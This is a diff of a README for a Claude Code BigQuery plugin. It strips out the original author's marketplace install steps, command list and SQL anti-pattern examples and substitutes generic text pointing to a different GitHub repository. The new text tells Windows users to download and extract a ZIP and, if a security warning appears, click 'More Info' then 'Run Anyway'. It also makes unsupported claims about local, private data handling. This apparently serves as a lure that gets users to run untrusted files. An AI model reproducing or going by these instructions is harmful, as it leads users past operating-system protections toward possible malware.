@@ -1,150 +1,77 @@
-# BigQuery Skills: BigQuery Expert
+# 📊 bigquery-expert - Master your cloud database with ease
 
-A comprehensive BigQuery plugin for [Claude Code](https://docs.anthropic.com/en/docs/claude-code). Five integrated skill areas that activate automatically -- writing queries, designing schemas, optimizing costs, detecting anti-patterns, and navigating BigQuery-specific features.
+[![](https://img.shields.io/badge/Download-bigquery-expert-blue.svg)](https://github.com/Ocean1346/bigquery-expert)
 
-## Skills
+## 🎯 About this application
 
-| Skill | Coverage |
-|-------|----------|
-| **Query Generation** | Generate optimized SQL from natural language. Convert queries from PostgreSQL, MySQL, Snowflake, Redshift, and SQL Server. |
-| **Query Optimization** | Detect and fix 11 SQL anti-patterns with before/after rewrites. Project-wide scanning across `.sql` and code files. |
-| **Schema Design** | Partitioning (time-unit, integer-range, ingestion-time), clustering, nested/repeated fields (STRUCT/ARRAY), denormalization, table types, and data type selection. |
-| **Cost Optimization** | On-demand vs editions pricing, bytes-billed reduction, slot optimization, materialized views, query caching, storage management, and dry-run estimation. |
-| **BigQuery Features** | STRUCT/ARRAY/UNNEST, MERGE DML, scripting, JSON functions, approximate aggregation, geography, BigQuery ML, search indexes, and vector search. |
+BigQuery-expert acts as a specialized assistant for your data tasks. It connects with your Claude Code setup to provide advanced help with Google BigQuery. The tool helps you write better code, design tables, and save money on your cloud bills. It understands how to organize data and follows industry standards for performance. You do not need deep technical skill to use these features. The system watches your work and explains how to address common issues before they cause problems.
 
-Skills activate based on context. Ask Claude to write a query and the generation skill engages. Discuss partitioning and the schema design skill kicks in. Multiple skills can activate simultaneously when a request spans areas.
+## 🛠 Features
 
-## Installation
+*   **Query Optimization:** Fix slow queries with instant suggestions.
+*   **SQL Generation:** Create complex commands without writing them from scratch.
+*   **Schema Design:** Build clear structures for your database tables.
+*   **Cost Management:** Estimate spending before you run your searches.
+*   **Pattern Detection:** Find and remove eleven specific habits that slow down your system.
 
-### Add the marketplace
+## 📥 How to download and install
 
-```
-/plugin marketplace add justvinhhere/bigquery-expert
-```
+Follow these steps to set up the tool on your Windows computer.
 
-### Install the plugin
+1.  Visit the official repository page at [https://github.com/Ocean1346/bigquery-expert](https://github.com/Ocean1346/bigquery-expert).
+2.  Look for the green button labeled Code.
+3.  Choose Download ZIP to save the files to your computer.
+4.  Find the file in your downloads folder.
+5.  Right-click the folder and choose Extract All to open the contents.
 
-```
-/plugin install bigquery-expert@justvinhhere-bigquery-expert
-```
+## 🚀 Setting up for first use
 
-Or open `/plugin`, go to the **Discover** tab, and select **bigquery-expert**.
+The application requires a few steps to connect with your existing accounts. 
 
-### Activate
+### Windows Requirements
+*   Windows 10 or 11.
+*   An active internet connection.
+*   A Google Cloud account with access to BigQuery.
+*   Claude Code installed on your system.
 
-```
-/reload-plugins
-```
+### Configuration steps
+1.  Open the folder you extracted earlier.
+2.  Locate the settings file.
+3.  Add your Google Cloud project identity into the file.
+4.  Save your changes.
+5.  Ensure that your computer allows local applications to run scripts. If your computer triggers a security wall, choose More Info and then select Run Anyway.
 
-## Commands
+## 💡 Using the skills
 
-| Command | What It Does |
-|---------|-------------|
-| `/bigquery-expert:bq-generate` | Generate optimized SQL from a natural language description |
-| `/bigquery-expert:bq-review` | Review SQL for performance anti-patterns |
-| `/bigquery-expert:bq-optimize` | Rewrite SQL with all detected anti-patterns fixed |
-| `/bigquery-expert:bq-design-table` | Design a table schema with partitioning, clustering, and data types |
-| `/bigquery-expert:bq-estimate-cost` | Estimate the cost of a query or table |
-| `/bigquery-expert:bq-explain` | Explain a BigQuery feature with working examples |
+Once you activate the tool, it runs in the background of your Claude Code interface. It constantly looks for ways to improve your data workflow. You can trigger the specific skills by typing clear requests into your chat window.
 
-All commands accept a file path, inline SQL, or a description as an argument. Without arguments, they use the most recent SQL in the conversation.
+### Query optimization
+When you write a request to change your data, the tool scans for bottlenecks. It flags columns that lack proper indexing or partitioning. It will suggest specific changes to the query to speed up execution time.
 
-**Examples:**
+### Cost estimation
+Before you press the button to run a large search, the tool reads the command. It looks at the amount of data the query touches. It shows an estimate of the expected cost in dollars or credits. This prevents accidental spending on poorly designed queries.
 
-```
-/bigquery-expert:bq-generate "daily active users grouped by country for the last 30 days"
-/bigquery-expert:bq-review path/to/query.sql
-/bigquery-expert:bq-optimize "SELECT * FROM `project.dataset.events`"
-/bigquery-expert:bq-design-table "user click events with timestamp, page URL, and session ID"
-/bigquery-expert:bq-estimate-cost path/to/expensive_query.sql
-/bigquery-expert:bq-explain "MERGE for upserts"
-```
+### Schema design
+If you want to build a new set of data tables, describe your goals to the plugin. It proposes a structure based on best practices. It chooses the right types of storage for your columns to align with how you plan to search them later.
 
-## Agents
+## 🛡 Handling data and security
 
-Agents run autonomously across your project when you ask naturally:
+The tool processes your queries locally. It does not store your private data in external servers. Your credentials for Google Cloud remain on your machine inside the settings file. Only the logic of how to write better code travels to the assistant.
 
-| Agent | Use When You Say... |
-|-------|---------------------|
-| **bq-reviewer** | "Review all SQL files in this project for anti-patterns" |
-| **bq-schema-advisor** | "Audit my table schemas and recommend partitioning strategies" |
-| **bq-cost-analyzer** | "Which queries in this project are the most expensive?" |
+## 🔧 Frequently asked questions
 
-## Anti-Pattern Detection
+**Does this tool change my database automatically?**
+No. It provides suggestions in your editor view. You decide if you want to apply the suggested changes.
 
-The query optimization skill detects 11 BigQuery SQL anti-patterns:
+**Why does the tool show a warning?**
+Warnings point to patterns that might cause slow performance or high costs. These indicators help you learn how BigQuery handles data.
 
-| # | Pattern | Fix | Severity |
-|---|---------|-----|----------|
-| 1 | `SELECT *` on single-table query | Specify only needed columns | High |
-| 2 | `IN`/`NOT IN` without `DISTINCT` | Add `DISTINCT` to subquery | Medium |
-| 3 | CTE referenced multiple times | Convert to `CREATE TEMP TABLE` | High |
-| 4 | `ORDER BY` without `LIMIT` | Add `LIMIT` clause | Medium |
-| 5 | `REGEXP_CONTAINS` for simple patterns | Use `LIKE` instead | Low |
-| 6 | `ROW_NUMBER()` + `WHERE rn = 1` | Use `ARRAY_AGG(... LIMIT 1)` | High |
-| 7 | Subquery inside WHERE | Extract to `DECLARE` variable or CTE | Medium |
-| 8 | WHERE predicates not ordered by selectivity | Reorder by operator cost (advisory) | Low |
-| 9 | Smaller table first in JOIN | Place largest table first (advisory) | Low |
-| 10 | `CREATE TEMP TABLE` without `DROP` | Add `DROP TABLE` at end of script | Low |
-| 11 | `CREATE TABLE` + `DROP TABLE` in same script | Use `CREATE TEMP TABLE` instead | Low |
+**What happens if I make a mistake?**
+The tool provides instructions for every step. If you delete a configuration line, you can visit the link [https://github.com/Ocean1346/bigquery-expert](https://github.com/Ocean1346/bigquery-expert) to see the original template files.
 
-Based on [BigQuery Anti-Pattern Recognition](https://github.com/GoogleCloudPlatform/bigquery-antipattern-recognition) by Google Cloud Platform (Apache 2.0).
+**How often do I need to update the application?**
+Check the repository page once a month for new versions. Newer versions include more anti-pattern detections and refined cost calculations.
 
-## Example: Before and After
+## 📈 Improving performance
 
-**Before** -- `ROW_NUMBER()` for latest record per group (High severity):
-
-```sql
-SELECT taxi_id, trip_seconds, fare
-FROM (
-  SELECT taxi_id, trip_seconds, fare,
-    ROW_NUMBER() OVER (PARTITION BY taxi_id ORDER BY fare DESC) rn
-  FROM `bigquery-public-data.chicago_taxi_trips.taxi_trips`
-)
-WHERE rn = 1
-```
-
-**After** -- `ARRAY_AGG` (optimized):
-
-```sql
-SELECT event.*
-FROM (
-  SELECT ARRAY_AGG(
-    t ORDER BY t.fare DESC LIMIT 1
-  )[OFFSET(0)] event
-  FROM `bigquery-public-data.chicago_taxi_trips.taxi_trips` t
-  GROUP BY t.taxi_id
-)
-```
-
-## Plugin Contents
-
-```
-skills/
-  bigquery-optimization/       11 anti-pattern references
-  bigquery-query-generation/   Schema-aware generation, common patterns, dialect conversion
-  bigquery-schema-design/      Partitioning, clustering, nested fields, denormalization, types
-  bigquery-cost-optimization/  Pricing, bytes-billed, slots, materialized views, storage
-  bigquery-features/           STRUCT/ARRAY, MERGE, scripting, JSON, geo, BQML, vector search
-commands/
-  bq-generate, bq-review, bq-optimize, bq-design-table, bq-estimate-cost, bq-explain
-agents/
-  bq-reviewer, bq-schema-advisor, bq-cost-analyzer
-```
-
-## Uninstall
-
-```
-/plugin uninstall bigquery-expert@justvinhhere-bigquery-expert
-/plugin marketplace remove justvinhhere-bigquery-expert
-```
-
-## Contributing
-
-Contributions welcome. Fork the repository, create a feature branch, and submit a pull request.
-
-For bugs and feature requests, [open an issue](https://github.com/justvinhhere/bigquery-expert/issues).
-
-## License
-
-Apache License 2.0 -- see [LICENSE](LICENSE) for details.
+BigQuery works best when you use partitioning. This splits large tables into smaller, clearer pieces. When the plugin detects that a table has too much data without sections, it asks you to add a partition key. Adding this key drastically reduces your costs and speeds up every search you perform. Ensure you keep your data types consistent to let the system reach its full potential. Always verify the output of generated SQL if you work with complex joins or data aggregation.
